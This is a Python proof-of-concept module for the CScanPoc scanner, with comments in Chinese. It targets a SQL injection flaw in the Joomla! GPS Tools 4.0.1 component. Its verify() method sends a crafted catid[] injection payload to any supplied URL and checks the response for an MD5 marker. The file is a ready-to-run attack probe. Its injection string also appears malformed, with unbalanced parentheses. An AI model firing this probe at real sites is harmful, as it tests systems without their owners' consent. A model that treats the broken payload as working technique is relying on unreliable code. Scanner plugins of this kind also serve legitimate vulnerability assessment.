# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Joomla_0042'  # 平台漏洞编号
    name = 'Joomla! GPS Tools组件SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-03-27'  # 漏洞公布时间
    desc = '''
    Joomla GPS Tools组件存在SQL注入漏洞。攻击者可利用漏洞访问或修改数据库数据。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-03328'
    cnvd_id = 'CNVD-2017-03328'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Joomla! GPS Tools 4.0.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '63b019c9-f169-4d24-b709-606a478899e0'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-08-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "?list_filter=Ihsan_Sencan&list_filter_field=author&filter_all_keywords=1&filter_order=a.catid&filter_order_Dir=desc&catid[]=66+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT(md5(233))a)+AND+1=1"

            vul_url = arg + payload
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            response = requests.get(vul_url)
            self.output.info("正在构造SQL注入测试语句")
            if response.status_code == 200 and 'e165421110ba03099a1c0393373c5b43' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
